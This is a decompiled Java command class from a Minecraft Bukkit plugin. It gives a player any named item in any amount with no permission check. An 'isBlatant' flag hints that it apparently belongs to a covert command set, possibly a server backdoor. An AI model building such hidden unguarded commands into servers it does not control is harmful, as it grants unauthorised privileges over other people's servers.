/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Material
 *  org.bukkit.entity.Player
 *  org.bukkit.inventory.ItemStack
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;

public class ItemCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (args.length <= 1) {
            p2.sendMessage(Settings.USAGE("i <item> <amount>"));
        } else if (Material.getMaterial((String)args[1].toUpperCase()) != null) {
            ItemStack togive = args.length <= 2 ? new ItemStack(Material.valueOf((String)args[1].toUpperCase()), 1) : new ItemStack(Material.valueOf((String)args[1].toUpperCase()), Integer.parseInt(args[2]));
            p2.getInventory().addItem(new ItemStack[]{togive});
        } else {
            p2.sendMessage(Settings.PREFIX("The item " + Settings.RED + args[1].toUpperCase() + Settings.WHITE + " doesn't seem to exist"));
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

